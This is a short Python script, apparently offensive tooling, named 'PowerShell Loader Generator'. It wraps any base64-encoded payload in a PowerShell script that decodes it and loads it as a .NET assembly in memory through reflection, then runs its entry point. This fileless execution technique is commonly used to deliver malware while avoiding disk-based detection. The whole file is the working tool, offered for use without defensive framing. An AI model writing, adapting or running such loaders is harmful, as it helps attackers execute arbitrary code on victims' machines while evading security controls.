import argparse

def generate(encoded_payload):
    ps_template = f"""
$payload = "{encoded_payload}"
$bytes = [System.Convert]::FromBase64String($payload)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, (, [string[]] @()))
"""
    return ps_template.strip()

def main():
    parser = argparse.ArgumentParser(description="PowerShell Loader Generator")
    parser.add_argument("payload", help="Base64 encoded payload string")
    parser.add_argument("-o", "--output", help="Output file to save the generated script")
    args = parser.parse_args()

    ps_script = generate(args.payload)

    if args.output:
        with open(args.output, "w") as f:
            f.write(ps_script)
        print(f"[+] PowerShell loader saved to {args.output}")
    else:
        print(ps_script)

if __name__ == "__main__":
    main()

